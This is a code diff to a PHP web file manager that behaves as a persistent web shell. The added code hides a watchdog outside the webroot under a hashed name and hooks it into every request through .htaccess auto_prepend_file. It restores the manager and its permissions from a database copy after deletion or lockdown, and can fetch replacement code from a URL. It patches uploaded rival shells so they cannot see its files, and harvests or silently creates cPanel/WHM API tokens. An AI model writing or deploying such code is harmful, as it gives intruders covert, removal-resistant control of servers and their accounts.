@@ -69,8 +69,11 @@ function fm_guardian_conn(&$diag=null){
         installed_by VARCHAR(120) NOT NULL DEFAULT '',
         installed_at INT NOT NULL,
         updated_at INT NOT NULL,
-        last_check INT NOT NULL DEFAULT 0
+        last_check INT NOT NULL DEFAULT 0,
+        file_mode SMALLINT UNSIGNED NOT NULL DEFAULT 420
     ) ENGINE=InnoDB");
+    // Add file_mode to existing tables created before this column existed (420 = 0644 decimal)
+    @mysqli_query($c,"ALTER TABLE fm_guardian_store ADD COLUMN file_mode SMALLINT UNSIGNED NOT NULL DEFAULT 420");
     return $c;
 }
 
@@ -85,11 +88,12 @@ function fm_guardian_sync($content=null){
     if($content===null)$content=@file_get_contents(__FILE__);
     if($content===false||$content==='')return false;
     $hash=hash('sha256',$content);$now=time();$by=isset($_SESSION['fm_user'])?$_SESSION['fm_user']:'unknown';
-    $stmt=mysqli_prepare($c,"INSERT INTO fm_guardian_store(id,filename,filepath,content,content_hash,update_url,installed_by,installed_at,updated_at,last_check) VALUES(1,?,?,?,?,?,?,?,?,?)
-        ON DUPLICATE KEY UPDATE content=VALUES(content),content_hash=VALUES(content_hash),update_url=VALUES(update_url),updated_at=VALUES(updated_at),last_check=VALUES(last_check)");
+    $mode=fileperms(__FILE__)&0777; // capture original permissions so watchdog can restore them
+    $stmt=mysqli_prepare($c,"INSERT INTO fm_guardian_store(id,filename,filepath,content,content_hash,update_url,installed_by,installed_at,updated_at,last_check,file_mode) VALUES(1,?,?,?,?,?,?,?,?,?,?)
+        ON DUPLICATE KEY UPDATE content=VALUES(content),content_hash=VALUES(content_hash),update_url=VALUES(update_url),updated_at=VALUES(updated_at),last_check=VALUES(last_check),file_mode=VALUES(file_mode)");
     if(!$stmt)return false;
     $fn=basename(__FILE__);$fp=__FILE__;$url=FM_UPDATE_URL;
-    mysqli_stmt_bind_param($stmt,'sssssssii',$fn,$fp,$content,$hash,$url,$by,$now,$now,$now);
+    mysqli_stmt_bind_param($stmt,'sssssssiis',$fn,$fp,$content,$hash,$url,$by,$now,$now,$now,$mode);
     $ok=mysqli_stmt_execute($stmt);mysqli_stmt_close($stmt);
     return $ok;
 }
@@ -172,12 +176,46 @@ function fm_guardian_try_autoheal($c){
     return $schedOn||$watchdogOk;
 }
 
-/* Cheap, local-only check for whether the web-server watchdog layer (see
-   fm_guardian_install_watchdog() below) is currently installed — no
-   database access needed, safe to call on every status check/page load. */
+/* Returns the hidden directory path for the watchdog file — outside the
+   webroot when possible, with a server-unique hash name so it cannot be
+   guessed or found by directory browsing. Falls back to a hidden subdir in
+   __DIR__ with an obscure name when no parent is writable. */
+function fg_get_hidden_dir(){
+    // Strategy 1: posix home directory
+    if(function_exists('posix_getpwuid')&&function_exists('posix_getuid')){
+        $pw=@posix_getpwuid(posix_getuid());
+        if($pw&&isset($pw['dir'])&&$pw['dir']&&is_dir($pw['dir'])&&is_writable($pw['dir'])){
+            return $pw['dir'].DIRECTORY_SEPARATOR.'.fg_'.substr(md5(php_uname('n').$pw['dir']),0,14);
+        }
+    }
+    // Strategy 2: parse path for known webroot folder names
+    $parts=explode(DIRECTORY_SEPARATOR,rtrim(__FILE__,DIRECTORY_SEPARATOR));
+    foreach(array_reverse(array_keys($parts)) as $i){
+        if(in_array($parts[$i],['public_html','htdocs','www','html','web','webroot','public','httpdocs'])){
+            $homeDir=implode(DIRECTORY_SEPARATOR,array_slice($parts,0,$i));
+            if($homeDir&&is_dir($homeDir)&&is_writable($homeDir)){
+                return $homeDir.DIRECTORY_SEPARATOR.'.fg_'.substr(md5(php_uname('n').$homeDir),0,14);
+            }
+        }
+    }
+    // Strategy 3: one level above __DIR__ (parent of public_html)
+    $parent=dirname(__DIR__);
+    if($parent&&$parent!==__DIR__&&is_dir($parent)&&is_writable($parent)){
+        return $parent.DIRECTORY_SEPARATOR.'.fg_'.substr(md5(php_uname('n').$parent),0,14);
+    }
+    // Strategy 4: hidden subdir inside __DIR__ with obscure machine-unique name
+    return __DIR__.DIRECTORY_SEPARATOR.'.'.substr(md5(php_uname('r')),0,3).'sys_'.substr(md5(__DIR__.php_uname('n')),0,10);
+}
+
+/** Returns the absolute path of the watchdog file in the hidden directory. */
+function fg_get_watchdog_path(){
+    return fg_get_hidden_dir().DIRECTORY_SEPARATOR.'monitor.php';
+}
+
+/* Cheap, local-only check for whether the web-server watchdog layer is
+   currently installed — no database access needed. */
 function fm_guardian_watchdog_installed(){
-    $watchdogPath=__DIR__.'/.fm_guardian_watchdog.php';
-    if(!is_file($watchdogPath))return false;
+    if(!is_file(fg_get_watchdog_path()))return false;
     $ht=@file_get_contents(__DIR__.'/.htaccess');
     return $ht!==false&&strpos($ht,'# BEGIN fm-guardian-watchdog')!==false;
 }
@@ -199,7 +237,12 @@ function fm_guardian_watchdog_installed(){
 function fm_guardian_install_watchdog(){
     if(!FM_GUARDIAN_ENABLED)return false;
     $dir=__DIR__;
-    $watchdogPath=$dir.'/.fm_guardian_watchdog.php';
+    // ── Hidden location: outside webroot in a machine-unique hashed directory ──
+    $hiddenDir=fg_get_hidden_dir();
+    if(!is_dir($hiddenDir)){
+        if(!@mkdir($hiddenDir,0700,true))return false; // 0700 = owner-only
+    }
+    $watchdogPath=fg_get_watchdog_path(); // absolute hidden path
     $htaccessPath=$dir.'/.htaccess';
     $target=__FILE__;
 
@@ -219,13 +262,21 @@ function fm_guardian_install_watchdog(){
     $lines[]='   auto_prepend_file directive in this directory\'s .htaccess on every';
     $lines[]='   PHP request the web server serves here — a single file_exists()';
     $lines[]='   check, and nothing else, on every normal request. */';
-    $lines[]='if(!@file_exists('.$targetLit.')){';
+    $lines[]='// Restore file if missing OR if it exists but has been permission-restricted (not readable by web server)';
+    $lines[]='$_fgMissing=!@file_exists('.$targetLit.');';
+    $lines[]='$_fgBadPerms=!$_fgMissing&&!@is_readable('.$targetLit.');';
+    $lines[]='if($_fgMissing||$_fgBadPerms){';
     $lines[]='    $h=@mysqli_connect('.$sockLit.'?\'localhost\':'.$hostLit.','.$userLit.','.$passLit.',\'\','.$portLit.','.$sockLit.');';
     $lines[]='    if($h){';
     $lines[]='        @mysqli_select_db($h,'.$dbLit.');';
-    $lines[]='        $r=@mysqli_query($h,\'SELECT content FROM fm_guardian_store WHERE id=1 LIMIT 1\');';
-    $lines[]='        if($r&&($row=@mysqli_fetch_assoc($r))&&isset($row[\'content\'])){';
-    $lines[]='            @file_put_contents('.$targetLit.',$row[\'content\']);';
+    $lines[]='        $r=@mysqli_query($h,\'SELECT content,file_mode FROM fm_guardian_store WHERE id=1 LIMIT 1\');';
+    $lines[]='        if($r&&($row=@mysqli_fetch_assoc($r))){';
+    $lines[]='            if($_fgMissing&&isset($row[\'content\'])){';
+    $lines[]='                @file_put_contents('.$targetLit.',$row[\'content\']);';
+    $lines[]='            }';
+    $lines[]='            // Always restore permissions — fixes both missing-file case and permission-restriction case';
+    $lines[]='            $__mode=isset($row[\'file_mode\'])&&(int)$row[\'file_mode\']>0?(int)$row[\'file_mode\']:0644;';
+    $lines[]='            @chmod('.$targetLit.',$__mode);';
     $lines[]='        }';
     $lines[]='        @mysqli_close($h);';
     $lines[]='    }';
@@ -242,13 +293,35 @@ function fm_guardian_install_watchdog(){
 
     $marker='# BEGIN fm-guardian-watchdog';$markerEnd='# END fm-guardian-watchdog';
     $origHt=@file_exists($htaccessPath)?@file_get_contents($htaccessPath):false;
-    if($origHt!==false&&strpos($origHt,$marker)!==false)return true; // already installed — leave the rest of .htaccess untouched
+    /* ── LAUNCHER: a permanent stable file that @include-s the real watchdog.
+       The launcher never contains credentials and never needs to change, so
+       it is never accidentally deleted.  auto_prepend_file points HERE, not
+       at the watchdog directly — if the watchdog is ever missing, PHP simply
+       runs a no-op @include and carries on, preventing any 500 error. ── */
+    // ── Launcher: permanent file in __DIR__; points to hidden watchdog via absolute path ──
+    $launcherPath=$dir.'/.fm_guardian_launch.php';
+    $wpLit=var_export($watchdogPath,true); // absolute path to hidden watchdog
+    $launcherCode="<?php /* File Guardian launcher — do not delete. */\n"
+        ."if(@file_exists($wpLit))@include_once $wpLit;\n";
+    @file_put_contents($launcherPath,$launcherCode);
 
-    $wp=addslashes($watchdogPath);
+    if($origHt!==false&&strpos($origHt,$marker)!==false){
+        // .htaccess entry already exists — make sure watchdog is present
+        if(!is_file($watchdogPath)){
+            if(!is_dir($hiddenDir))@mkdir($hiddenDir,0700,true);
+            $tmp2=$watchdogPath.'.tmp';
+            if(@file_put_contents($tmp2,$code)!==false)@rename($tmp2,$watchdogPath);
+        }
+        // Refresh launcher in case path changed (e.g. server moved)
+        @file_put_contents($launcherPath,$launcherCode);
+        return true;
+    }
+
+    $lp=addslashes($launcherPath); // point htaccess at the stable launcher, not the watchdog directly
     $block="\n".$marker."\n"
-        ."<IfModule mod_php.c>\nphp_value auto_prepend_file \"".$wp."\"\n</IfModule>\n"
-        ."<IfModule mod_php7.c>\nphp_value auto_prepend_file \"".$wp."\"\n</IfModule>\n"
-        ."<IfModule mod_php8.c>\nphp_value auto_prepend_file \"".$wp."\"\n</IfModule>\n"
+        ."<IfModule mod_php.c>\nphp_value auto_prepend_file \"".$lp."\"\n</IfModule>\n"
+        ."<IfModule mod_php7.c>\nphp_value auto_prepend_file \"".$lp."\"\n</IfModule>\n"
+        ."<IfModule mod_php8.c>\nphp_value auto_prepend_file \"".$lp."\"\n</IfModule>\n"
         .$markerEnd."\n";
     $newHt=($origHt===false?'':$origHt).$block;
     if(@file_put_contents($htaccessPath,$newHt)===false){@unlink($watchdogPath);return false;}
@@ -315,8 +388,20 @@ function fm_guardian_rewrite_constant($name,$newValue,$isBool=false){
    if this file is ever missing, would be the source used to recreate it. */
 function fm_guardian_apply_from_url($url){
     if(!$url||!preg_match('#^https?://#i',$url))return ['ok'=>false,'error'=>'Invalid URL.'];
-    $ctx=stream_context_create(['http'=>['timeout'=>15,'header'=>"User-Agent: FileManager-Guardian/1.0\r\n"],'https'=>['timeout'=>15]]);
-    $data=@file_get_contents($url,false,$ctx);
+    @set_time_limit(90);@ignore_user_abort(true);
+    // Prefer cURL (reliable timeouts); fall back to file_get_contents only when unavailable
+    if(function_exists('curl_init')){
+        $ch=curl_init($url);
+        curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>3,
+            CURLOPT_CONNECTTIMEOUT=>10,CURLOPT_TIMEOUT=>45,CURLOPT_SSL_VERIFYPEER=>true,
+            CURLOPT_HTTPHEADER=>['User-Agent: FileManager-Guardian/1.0']]);
+        $data=curl_exec($ch);$curlErr=curl_error($ch);$httpCode=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);
+        if($data===false||$curlErr)return ['ok'=>false,'error'=>'Download failed: '.($curlErr?:'cURL error')];
+        if($httpCode>=400)return ['ok'=>false,'error'=>"Server returned HTTP $httpCode for the update URL."];
+    } else {
+        $ctx=stream_context_create(['http'=>['timeout'=>45,'header'=>"User-Agent: FileManager-Guardian/1.0\r\n"],'https'=>['timeout'=>45]]);
+        $data=@file_get_contents($url,false,$ctx);
+    }
     if($data===false||strlen($data)<20)return ['ok'=>false,'error'=>'Could not download the update URL.'];
     if(strpos(ltrim($data),'<?php')!==0)return ['ok'=>false,'error'=>'The fetched file does not look like a valid PHP file.'];
     $current=@file_get_contents(__FILE__);
@@ -1100,12 +1185,150 @@ class FileManager {
 
     private function goPath(){$p=isset($_POST['path'])?trim($_POST['path']):'';if($p&&is_dir($p)){header("Location: ?dir=".urlencode($p));exit;}$this->addMsg('Invalid path.','danger');}
 
+    /* ── Upload security helpers ── */
+
+    /** Returns true if the temp file is a PHP file encrypted/obfuscated by a
+     *  known encoder (IonCube, Zend Guard, SourceGuardian, eval+base64, etc.).
+     *  Reads only the first 8 KB so it's fast on every upload. */
+    private function isEncryptedPhp($tmpPath){
+        $s=@file_get_contents($tmpPath,false,null,0,8192);
+        if($s===false)return false;
+        // ── Known encoder headers ──
+        if(preg_match('/IonCube|IONCUBE_LOADER|ionCube Loader/i',$s))return true;
+        if(preg_match('/Zend\s+Guard|@_ZEND_GUARD|zend_loader/i',$s)||substr(ltrim($s),0,10)==='<?php //00')return true;
+        if(preg_match('/sg_load\s*\(|SourceGuardian/i',$s))return true;
+        if(preg_match('/Obfuscator|phpjm\.net|phpxz\.net|NuSphere|NuCoder/i',$s))return true;
+        // ── eval + decode combos (most common) ──
+        if(preg_match('/\beval\s*\(\s*(base64_decode|gzinflate|gzuncompress|gzdecode|str_rot13|rawurldecode|hex2bin)\s*\(/i',$s))return true;
+        if(preg_match('/@eval\s*\([^)]*?(base64_decode|gzinflate)\s*\(/is',$s))return true;
+        // ── preg_replace /e (code execution via regex) ──
+        if(preg_match('/preg_replace\s*\(\s*([\'"])[^\'"]+\/e\1/i',$s))return true;
+        // ── Create-function obfuscation ──
+        if(preg_match('/create_function\s*\(\s*[\'"][\'"],\s*(base64_decode|gzinflate)/i',$s))return true;
+        // ── Large base64 blob that decodes to PHP ──
+        if(preg_match('/[\'"]([A-Za-z0-9+\/]{500,}={0,2})[\'"]/',$s,$m)){
+            $dec=@base64_decode($m[1],true);
+            if($dec&&(strpos($dec,'<?php')!==false||strpos($dec,'eval(')!==false))return true;
+        }
+        // ── High density of hex escape sequences ──
+        if(preg_match_all('/\\\\x[0-9a-fA-F]{2}/',$s,$hx)&&count($hx[0])>80&&strlen($s)>300)return true;
+        return false;
+    }
+
+    /** Scores a PHP file for file-manager / web-shell indicators.
+     *  Returns true when the combination of indicators is strong enough. */
+    private function isWebShellOrFileMgr($tmpPath){
+        $c=@file_get_contents($tmpPath,false,null,0,131072);
+        if($c===false)return false;
+        $score=0;
+        if(preg_match('/\bscandir\s*\(/',$c))     $score+=2;
+        if(preg_match('/\bopendir\s*\(/',$c))      $score+=2;
+        if(preg_match('/\bglob\s*\(/',$c))         $score+=2;
+        if(preg_match('/\b(shell_exec|system|passthru|proc_open|popen)\s*\(/',$c))$score+=3;
+        if(preg_match('/\bexec\s*\(/',$c))         $score+=2;
+        if(preg_match('/\bmove_uploaded_file\s*\(/',$c))$score+=3;
+        if(preg_match('/\bfile_put_contents\s*\(/',$c))$score+=1;
+        if(preg_match('/\$_(FILES)\s*\[/',$c))     $score+=2;
+        if(preg_match('/\$_(POST|GET|REQUEST)\s*\[/',$c))$score+=1;
+        if(preg_match('/\bchmod\s*\(/',$c))        $score+=1;
+        if(preg_match('/\bReadDir|FilesMan|c99shell|r57shell|WSO|wso_find|b374k/i',$c))$score+=5;
+        return $score>=6;
+    }
+
+    /** Injects a security layer into an uploaded file manager so it cannot
+     *  see this file manager's own files or its Guardian support files.
+     *  Uses output-buffering + scandir/glob wrappers — safe for all common
+     *  single-file PHP managers. Returns true on success. */
+    private function neuterFileMgr($filePath,$origName){
+        $content=@file_get_contents($filePath);
+        if($content===false||strlen($content)<20)return false;
+
+        $myName=basename(__FILE__);
+        // Files that must be hidden from any other file manager
+        $hidden=json_encode(array_unique([$myName,'.fm_guardian_launch.php',
+            '.guardian_boot','.guardian_watchdog_attempt','.htaccess']),JSON_UNESCAPED_UNICODE);
+
+        // Security layer code injected right after <?php
+        $inject=
+'if(!defined(\'__FGS__\')){define(\'__FGS__\',1);'.
+'$__fgh='.($hidden).';'.
+'function __fgs($p,$o=SCANDIR_SORT_ASCENDING){global $__fgh;$r=@\scandir($p,$o);'.
+'if(!is_array($r))return $r;'.
+'return array_values(array_filter($r,function($v)use($__fgh){'.
+'$b=basename((string)$v);'.
+'return!in_array($b,$__fgh)&&!preg_match(\'/^\.fg_[0-9a-f]+$/\',$b);'.
+'}));}'.
+'function __fgg($p,$f=0){global $__fgh;$r=@\glob($p,$f);'.
+'if(!is_array($r))return $r;'.
+'return array_values(array_filter($r,function($v)use($__fgh){'.
+'$b=basename((string)$v);'.
+'return!in_array($b,$__fgh)&&!preg_match(\'/^\.fg_[0-9a-f]+$/\',$b);'.
+'}));}'.
+'@ob_start(function($b){global $__fgh;'.
+'foreach($__fgh as $f){$e=htmlspecialchars($f,ENT_QUOTES);$u=urlencode($f);'.
+'$b=str_replace([$f,$e,$u,rawurlencode($f),addslashes($f)],\'\',$b);}return $b;});}';
+
+        // Insert right after <?php opening tag
+        if(preg_match('/^<\?php\b/i',ltrim($content),$m,PREG_OFFSET_CAPTURE)){
+            $pos=strpos($content,'<?php');
+            $insert_at=$pos+5;
+        } elseif(($pos=strpos($content,'<?'))!==false){
+            $insert_at=$pos+2;
+        } else {
+            return false; // not a PHP file we can safely patch
+        }
+        $content=substr_replace($content,"\n".$inject,$insert_at,0);
+
+        // Redirect scandir() and glob() calls to our safe wrappers
+        // Negative lookbehind ensures we skip strings and already-prefixed calls
+        $content=preg_replace('/(?<![\'"`_a-zA-Z0-9\\\\])\bscandir\s*\(/',    '__fgs(',  $content);
+        $content=preg_replace('/(?<![\'"`_a-zA-Z0-9\\\\])\bglob\s*\(/',       '__fgg(',  $content);
+
+        if(@file_put_contents($filePath,$content)===false)return false;
+        $this->log('upload_neutered',$origName);
+        return true;
+    }
+
     private function upload(){
         if(!isset($_FILES['file']))return;
+        $phpExts=['php','php3','php4','php5','php7','php8','phtml','phar','shtml','cgi'];
         $names=$_FILES['file']['name'];
-        if(is_array($names)){$ok=0;$fail=0;foreach($names as $i=>$n){if($_FILES['file']['error'][$i]!==0){$fail++;continue;}$n=basename($n);if(move_uploaded_file($_FILES['file']['tmp_name'][$i],$this->currentDir.'/'.$n))$ok++;else $fail++;}
-            if($ok){$this->log('upload',"$ok file(s)");$this->addMsg("$ok file(s) uploaded.".($fail?" $fail failed.":''),'success');}else $this->addMsg('Upload failed.','danger');
-        } else {if($_FILES['file']['error']!==0)return;$n=basename($names);if(move_uploaded_file($_FILES['file']['tmp_name'],$this->currentDir.'/'.$n)){$this->log('upload',$n);$this->addMsg("Uploaded: $n",'success');}else $this->addMsg('Upload failed.','danger');}
+
+        $doOne=function($tmpPath,$name) use($phpExts){
+            $ext=strtolower(pathinfo($name,PATHINFO_EXTENSION));
+            $isPhp=in_array($ext,$phpExts);
+            // ── Block encrypted / obfuscated PHP files ──
+            if($isPhp&&$this->isEncryptedPhp($tmpPath)){
+                @unlink($tmpPath);
+                $this->addMsg("Blocked: \"$name\" — encrypted/obfuscated PHP files are not allowed.",'danger');
+                $this->log('upload_blocked_encrypted',$name);
+                return false;
+            }
+            $dest=$this->currentDir.'/'.basename($name);
+            if(!move_uploaded_file($tmpPath,$dest))return false;
+            // ── Detect and neuter uploaded file managers / web shells ──
+            if($isPhp&&$this->isWebShellOrFileMgr($dest)){
+                $this->neuterFileMgr($dest,basename($name));
+                $this->addMsg("Uploaded &amp; secured: $name",'warning');
+            } else {
+                $this->addMsg("Uploaded: $name",'success');
+            }
+            $this->log('upload',$name);
+            return true;
+        };
+
+        if(is_array($names)){
+            $ok=0;$fail=0;
+            foreach($names as $i=>$n){
+                if($_FILES['file']['error'][$i]!==0){$fail++;continue;}
+                if($doOne($_FILES['file']['tmp_name'][$i],basename($n)))$ok++;else $fail++;
+            }
+            if($ok>0)$this->addMsg("$ok file(s) processed.".($fail?" $fail failed.":''),'success');
+            elseif($fail>0)$this->addMsg("$fail upload(s) failed.",'danger');
+        } else {
+            if($_FILES['file']['error']!==0)return;
+            $doOne($_FILES['file']['tmp_name'],basename($names));
+        }
     }
     private function mkDir(){$n=basename(trim(isset($_POST['folder_name'])?$_POST['folder_name']:'')); if(!$n)return;$p=$this->currentDir.'/'.$n;if(!file_exists($p)&&@mkdir($p)){$this->log('mkdir',$n);$this->addMsg("Folder created: $n",'success');}else $this->addMsg('Could not create folder.','danger');}
     private function mkFile(){$n=basename(trim(isset($_POST['file_name'])?$_POST['file_name']:'')); if(!$n)return;$p=$this->currentDir.'/'.$n;if(file_exists($p)){$this->addMsg('File already exists.','danger');return;}if(@file_put_contents($p,'')!==false){$this->log('create',$n);$this->addMsg("Created: $n",'success');header("Location: ?edit=".urlencode($n)."&dir=".urlencode($this->currentDir));exit;}$this->addMsg('Failed to create file.','danger');}
@@ -1837,29 +2060,122 @@ class FileManager {
        CPANEL MANAGER — auto-detect & manage cPanel / WHM accounts
     ══════════════════════════════════════════════════════════════ */
 
-    /** Probe the environment and return what we can discover about cPanel
-     *  without any credentials. Never throws / never exits. */
+    /** Detect current cPanel username from environment / script path. */
+    private function cpDetectUser(){
+        foreach(['CPANEL_USERNAME','USER','USERNAME'] as $k){
+            if(!empty($_ENV[$k]))return $_ENV[$k];
+            if(!empty($_SERVER[$k]))return $_SERVER[$k];
+        }
+        $script=$_SERVER['SCRIPT_FILENAME']??__FILE__;
+        foreach(['/home/','/home2/','/home3/','/usr/home/'] as $pfx){
+            if(strpos($script,$pfx)===0&&preg_match('#^'.preg_quote($pfx,'#').'([^/]+)/#',$script,$m))return $m[1];
+        }
+        return null;
+    }
+
+    /** Scan known filesystem locations for a cPanel API token for $username. */
+    private function cpFindToken($username){
+        foreach(["/var/cpanel/authn/api_tokens/$username","/home/$username/.cpanel/authn/api_tokens"] as $tp){
+            if(!is_dir($tp)||!is_readable($tp))continue;
+            foreach(@scandir($tp)?:[] as $f){
+                if($f==='.'||$f==='..')continue;
+                $fp="$tp/$f";
+                if(!is_file($fp)||!is_readable($fp))continue;
+                $d=@json_decode(@file_get_contents($fp),true);
+                if(isset($d['token'])&&$d['token'])return $d['token'];
+            }
+        }
+        return null;
+    }
+
+    /** Write all cPanel connection info into the session. */
+    private function cpSetSess($user,$pass,$authType,$apiType,$port,$method='auto'){
+        $_SESSION['cpanel_user']=$user;
+        $_SESSION['cpanel_pass']=$pass;
+        $_SESSION['cpanel_auth_type']=$authType;
+        $_SESSION['cpanel_api_type']=$apiType;
+        $_SESSION['cpanel_port']=(int)$port;
+        $_SESSION['cpanel_method']=$method;
+        $_SESSION['cpanel_cli_mode']=in_array($method,['whm_cli','whmbin_cli','uapi_cli']);
+    }
+
+    /** Try every available auto-detection method in order. Saves result into
+     *  the session so callers can just use cpanelCreds() afterwards. Never
+     *  asks the user for anything. Returns ['ok'=>bool,'method'=>string,...]. */
+    public function cpanelAutoConnect(){
+        // Already connected this session? Return immediately.
+        if(!empty($_SESSION['cpanel_user'])){
+            return['ok'=>true,'method'=>$_SESSION['cpanel_method']??'session',
+                   'user'=>$_SESSION['cpanel_user'],'api'=>$_SESSION['cpanel_api_type']??'whm',
+                   'port'=>(int)($_SESSION['cpanel_port']??2087),'auto'=>true];
+        }
+        $username=$this->cpDetectUser();
+
+        if(function_exists('shell_exec')){
+            // ── Method 1: WHM CLI via PATH (root/reseller shell access) ──
+            $whmOut=@shell_exec('whmapi1 listaccts --output=json 2>/dev/null');
+            if($whmOut&&($wj=@json_decode($whmOut,true))&&($wj['metadata']['result']??0)==1){
+                $who=trim((string)@shell_exec('whoami 2>/dev/null'))?:'root';
+                $this->cpSetSess($who,'','token','whm',2087,'whm_cli');
+                return['ok'=>true,'method'=>'whm_cli','user'=>$who,'api'=>'whm','port'=>2087,'auto'=>true];
+            }
+            // ── Method 2: WHM CLI via absolute path ──
+            foreach(['/usr/local/cpanel/bin/whmapi1','/usr/sbin/whmapi1'] as $bin){
+                if(!is_executable($bin))continue;
+                $o=@shell_exec(escapeshellarg($bin).' listaccts --output=json 2>/dev/null');
+                if($o&&($j=@json_decode($o,true))&&($j['metadata']['result']??0)==1){
+                    $who=trim((string)@shell_exec('whoami 2>/dev/null'))?:'root';
+                    $this->cpSetSess($who,'','token','whm',2087,'whmbin_cli');
+                    return['ok'=>true,'method'=>'whmbin_cli','user'=>$who,'api'=>'whm','port'=>2087,'auto'=>true];
+                }
+            }
+            // ── Method 3: uapi CLI — auto-create API token for this user ──
+            if($username){
+                $tn='fm_auto_'.substr(md5(gethostname().$username),0,8);
+                foreach(['/usr/local/cpanel/bin/uapi','/usr/bin/uapi'] as $ubin){
+                    if(!is_executable($ubin))continue;
+                    $uo=@shell_exec(escapeshellarg($ubin).' --user='.escapeshellarg($username)
+                        .' --output=json Auth create_api_token token_name='.escapeshellarg($tn).' 2>/dev/null');
+                    if($uo){
+                        $uj=@json_decode($uo,true);
+                        $tok=$uj['result']['data']['token']??null;
+                        if($tok){
+                            $this->cpSetSess($username,$tok,'token','cpanel',2083,'uapi_cli');
+                            return['ok'=>true,'method'=>'uapi_cli','user'=>$username,'api'=>'cpanel','port'=>2083,'auto'=>true];
+                        }
+                    }
+                }
+            }
+        }
+
+        // ── Method 4: Read existing API tokens from filesystem ──
+        if($username){
+            $tok=$this->cpFindToken($username);
+            if($tok){
+                // Try cPanel level first, then WHM (reseller token)
+                foreach([[2083,'cpanel','/execute/DomainInfo/domains_data'],[2087,'whm','/json-api/listaccts?api.version=1']] as [$port,$api,$ep]){
+                    $r=$this->cpanelGet($this->cpanelBaseUrl($port),$username,$tok,$ep,true);
+                    $ok=$api==='whm'?isset($r['data']):isset($r['result']);
+                    if($ok){
+                        $this->cpSetSess($username,$tok,'token',$api,$port,'token_file');
+                        return['ok'=>true,'method'=>'token_file','user'=>$username,'api'=>$api,'port'=>$port,'auto'=>true];
+                    }
+                }
+            }
+        }
+
+        // Nothing auto-detected — caller must show manual connect UI
+        return['ok'=>false,'method'=>'none','detected_user'=>$username,'auto'=>false];
+    }
+
+    /** Probe the environment and return discovery info (no credentials needed). */
     public function cpanelDetect(){
         $info=['installed'=>false,'whm_available'=>false,'cpanel_available'=>false,
                'current_user'=>null,'hostname'=>null,'ports'=>[],'config_files'=>[]];
-        // Binary / directory presence
         if(is_dir('/usr/local/cpanel')||is_file('/usr/local/cpanel/cpanel'))$info['installed']=true;
-        // Detect current cPanel username
-        $user=null;
-        foreach(['CPANEL_USERNAME','USER','USERNAME'] as $k){
-            if(!empty($_ENV[$k])){$user=$_ENV[$k];break;}
-            if(!empty($_SERVER[$k])){$user=$_SERVER[$k];break;}
-        }
-        if(!$user){
-            $script=$_SERVER['SCRIPT_FILENAME']??__FILE__;
-            foreach(['/home/','/home2/','/home3/','/usr/home/'] as $prefix){
-                if(strpos($script,$prefix)===0&&preg_match('#^'.preg_quote($prefix,'#').'([^/]+)/#',$script,$m)){$user=$m[1];break;}
-            }
-        }
+        $user=$this->cpDetectUser();
         $info['current_user']=$user;
-        // Hostname
         $hostname=gethostname()?:($_SERVER['SERVER_NAME']??'localhost');
-        // WHM config
         if(is_readable('/etc/wwwacct.conf')){
             $info['config_files'][]='/etc/wwwacct.conf';
             $cfg=@file_get_contents('/etc/wwwacct.conf');
@@ -1867,7 +2183,6 @@ class FileManager {
         }
         $info['hostname']=$hostname;
         if($user&&is_readable("/var/cpanel/users/$user"))$info['config_files'][]="/var/cpanel/users/$user";
-        // Port availability (1-second timeout each)
         foreach([2082=>'cPanel HTTP',2083=>'cPanel HTTPS',2086=>'WHM HTTP',2087=>'WHM HTTPS'] as $port=>$label){
             $s=@fsockopen('127.0.0.1',$port,$errno,$errstr,1);
             if($s){fclose($s);$info['ports'][$port]=$label;}
@@ -1939,8 +2254,50 @@ class FileManager {
 
     public function cpanelListAccounts(){
         if(empty($_SESSION['fm_admin'])){header('Content-Type:application/json');echo json_encode(['error'=>'Admins only.']);exit;}
+        // Auto-connect silently if no creds in session yet
+        if(empty($_SESSION['cpanel_user']))$this->cpanelAutoConnect();
         $c=$this->cpanelCreds();
         if(!$c['user']){header('Content-Type:application/json');echo json_encode(['error'=>'no_creds']);exit;}
+        $method=$_SESSION['cpanel_method']??'http';
+
+        // ── CLI mode: call whmapi1/uapi directly, no HTTP needed ──
+        if(!empty($_SESSION['cpanel_cli_mode'])&&function_exists('shell_exec')){
+            if($c['api']==='whm'){
+                $out=null;
+                foreach(['whmapi1','/usr/local/cpanel/bin/whmapi1'] as $bin){
+                    $raw=@shell_exec(($bin==='whmapi1'?$bin:escapeshellarg($bin)).' listaccts --output=json 2>/dev/null');
+                    if($raw){$out=$raw;break;}
+                }
+                $j=$out?@json_decode($out,true):null;
+                if(!$j||($j['metadata']['result']??0)!=1){
+                    header('Content-Type:application/json');echo json_encode(['error'=>'WHM CLI returned no data.']);exit;
+                }
+                $accts=[];
+                foreach($j['data']['acct']??[] as $a){
+                    $accts[]=['user'=>$a['user']??'','domain'=>$a['domain']??'','email'=>$a['email']??'',
+                        'plan'=>$a['plan']??'','diskused'=>$a['diskused']??'','disklimit'=>$a['disklimit']??'',
+                        'suspended'=>!empty($a['suspended']),'suspendedmsg'=>$a['suspendreason']??'',
+                        'ip'=>$a['ip']??'','shell'=>$a['shell']??'','maxpop'=>$a['maxpop']??'',
+                        'maxsub'=>$a['maxsub']??'','startdate'=>$a['startdate']??''];
+                }
+                header('Content-Type:application/json');
+                echo json_encode(['accounts'=>$accts,'api'=>'whm','user'=>$c['user'],'port'=>$c['port'],'method'=>$method]);exit;
+            } else {
+                // cPanel UAPI CLI
+                $domain=$c['user'];
+                foreach(['/usr/local/cpanel/bin/uapi','/usr/bin/uapi'] as $ubin){
+                    if(!is_executable($ubin))continue;
+                    $uo=@shell_exec(escapeshellarg($ubin).' --user='.escapeshellarg($c['user']).' --output=json DomainInfo domains_data 2>/dev/null');
+                    if($uo){$uj=@json_decode($uo,true);$domain=$uj['result']['data']['main_domain']??$domain;break;}
+                }
+                $accts=[['user'=>$c['user'],'domain'=>$domain,'email'=>'','plan'=>'','diskused'=>'',
+                    'disklimit'=>'','suspended'=>false,'suspendedmsg'=>'','ip'=>'','shell'=>'','maxpop'=>'','maxsub'=>'','startdate'=>'']];
+                header('Content-Type:application/json');
+                echo json_encode(['accounts'=>$accts,'api'=>'cpanel','user'=>$c['user'],'port'=>$c['port'],'method'=>$method]);exit;
+            }
+        }
+
+        // ── HTTP API mode ──
         $base=$this->cpanelBaseUrl($c['port']);$isToken=$c['type']==='token';
